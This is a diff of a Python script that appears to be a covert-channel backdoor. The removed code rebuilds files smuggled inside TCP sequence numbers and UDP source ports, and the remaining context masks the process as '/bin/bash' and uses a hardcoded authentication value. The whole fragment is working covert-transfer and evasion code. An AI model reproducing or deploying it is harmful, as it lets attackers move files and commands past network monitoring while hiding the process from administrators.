@@ -29,40 +29,6 @@ authentication ="1337"
 
 myip=("192.168.0.3",66)
 
-def writeFile(UID):
-    for element in messages:
-        text = ""
-        bits = ""
-        fileName = ""
-        fileContents = ""
-        if(element[0] == UID):
-            data = element[2]
-            for value in data:
-                text += str(value)
-                pass
-            #Split into chunks of 8
-            line = text
-            n = 8
-            chunks = [line[i:i+n] for i in range(0, len(line), n)]
-            #Convert each element in array to integer & letter.
-            for x in range(0, len(chunks)):
-                chunks[x] = int(chunks[x], 2)
-                chunks[x] = chr(chunks[x])
-
-            binaryString = ''.join(chunks)
-
-            delimiter = binaryString.index('00000000')
-            #Everything until the delimiter is the file name
-            fileName = binaryString[0:delimiter]
-            decryptedFileName = decrypt(fileName)
-
-            fileContents = fileContents.join(chunks[delimiter+8:])
-
-    createFile = open(decryptedFileName, 'w')
-    createFile.write(fileContents)
-    createFile.close()
-
-
 def secret_send(msg:str, type:str='command'):
     '''
     Keyword arguments:
@@ -277,34 +243,6 @@ def authenticate(packet):
         else:
             return False
     return False
-
-def receiveFile(packet):
-    if(packet.haslayer(IP) and packet[IP].src != myip[0]):
-            if authenticate(packet):
-                payload = decrypt(packet["Raw"].load).split("\n")
-                UID = payload[1]
-                position = payload[2].split(":")[0]
-                total = payload[2].split(":")[1]
-                if(packet.haslayer(TCP)):
-                    #Define the length
-                    length = 32
-                    # convert to binary
-                    field = packet[TCP].seq
-                    #Converts the bits to the nearest divisible by 8
-                    covertContent = lengthChecker("TCP",field)
-                elif(packet.haslayer(UDP)):
-                    length = 16
-                    # convert to binary
-                    field = packet[UDP].sport
-                    covertContent = lengthChecker("UDP",field)
-                if(total > 1):
-                    #"Multipart command, add to messages"
-                    addToMessages(messages, UID, total, covertContent)
-                    # After every add, check if the max has been reached
-                    if(checkMessages(UID)):
-                        #If all the packets have been received, write it out
-                        #to file
-                        writeFile(UID)
 
 setproctitle.setproctitle("/bin/bash") #set fake process name
 #print(setproctitle.getproctitle())
